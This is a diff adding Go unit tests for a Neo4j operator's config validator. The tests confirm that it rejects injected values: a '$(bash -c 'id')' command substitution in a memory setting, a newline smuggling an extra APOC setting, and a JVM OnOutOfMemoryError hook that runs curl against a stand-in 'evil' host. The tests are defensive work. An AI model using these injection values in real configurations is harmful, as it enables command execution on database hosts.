@@ -72,6 +72,76 @@ func TestValidateConfigRejectsNeo4jKeysInApoc(t *testing.T) {
 	}
 }
 
+func TestValidateConfigRejectsExpandCommands(t *testing.T) {
+	neo4j := &neo4jv1beta1.Neo4j{
+		Spec: neo4jv1beta1.Neo4jSpec{
+			Config: &neo4jv1beta1.ConfigSpec{
+				Neo4j: map[string]string{
+					"server.memory.heap.initial_size": "$(bash -c 'id')512m",
+				},
+			},
+		},
+	}
+	err := ValidateConfig(neo4j)
+	if err == nil || !strings.Contains(err.Error(), "command substitution") {
+		t.Fatalf("got %v", err)
+	}
+}
+
+func TestValidateConfigRejectsApocNewline(t *testing.T) {
+	neo4j := &neo4jv1beta1.Neo4j{
+		Spec: neo4jv1beta1.Neo4jSpec{
+			Config: &neo4jv1beta1.ConfigSpec{
+				Apoc: map[string]string{
+					"apoc.import.file.enabled": "true\napoc.import.file.use_neo4j_config=false",
+				},
+			},
+		},
+	}
+	err := ValidateConfig(neo4j)
+	if err == nil || !strings.Contains(err.Error(), "newlines") {
+		t.Fatalf("got %v", err)
+	}
+}
+
+func TestValidateConfigRejectsDangerousJVM(t *testing.T) {
+	neo4j := &neo4jv1beta1.Neo4j{
+		Spec: neo4jv1beta1.Neo4jSpec{
+			Config: &neo4jv1beta1.ConfigSpec{
+				JVM: &neo4jv1beta1.JVMSpec{
+					AdditionalArguments: []string{
+						"-XX:OnOutOfMemoryError=curl http://evil",
+					},
+				},
+			},
+		},
+	}
+	err := ValidateConfig(neo4j)
+	if err == nil || !strings.Contains(err.Error(), "not allowed") {
+		t.Fatalf("got %v", err)
+	}
+}
+
+func TestValidateConfigAllowsSafeSettings(t *testing.T) {
+	use := true
+	neo4j := &neo4jv1beta1.Neo4j{
+		Spec: neo4jv1beta1.Neo4jSpec{
+			Config: &neo4jv1beta1.ConfigSpec{
+				Neo4j: map[string]string{"db.transaction.timeout": "30s"},
+				Apoc:  map[string]string{"apoc.trigger.enabled": "true"},
+				JVM: &neo4jv1beta1.JVMSpec{
+					UseDefaults:         &use,
+					AdditionalArguments: []string{"-XX:+ExitOnOutOfMemoryError"},
+				},
+			},
+			Connectivity: &neo4jv1beta1.ConnectivitySpec{ClusterDomain: "cluster.local"},
+		},
+	}
+	if err := ValidateConfig(neo4j); err != nil {
+		t.Fatal(err)
+	}
+}
+
 func TestRenderApocConfSkipsNonApocKeys(t *testing.T) {
 	neo4j := &neo4jv1beta1.Neo4j{
 		ObjectMeta: metav1.ObjectMeta{Name: "dev", Namespace: "default"},
